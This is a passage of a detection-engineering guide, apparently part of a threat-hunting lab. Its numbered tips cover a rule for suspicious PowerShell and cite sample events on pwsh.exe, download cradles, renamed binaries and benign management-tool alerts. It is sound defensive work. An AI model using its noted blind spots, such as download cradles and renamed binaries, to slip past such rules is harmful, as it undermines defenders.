4. **Include `pwsh.exe`.** PowerShell 7 is a separate binary (`thl-evt-0013`).
5. **`-NoProfile` and hidden windows are not enough by themselves.** Both
   appear in benign automation (`thl-evt-0006`, `0015`).
6. **Download cradles (`thl-evt-0010`)** have no encoded command. They need
   their own detection or an explicit decision to leave them out of scope.
7. **Renamed binaries (`thl-evt-0016`)** need `process.pe.original_file_name`.
   Without it, a name-based rule will miss this event. Document the gap; do
   not hide it.
8. **Expect `thl-evt-0011`-style alerts** from management tools. Document them
   as known benign triggers and decide how to handle them (narrow exclusion or
   accept the alert volume).
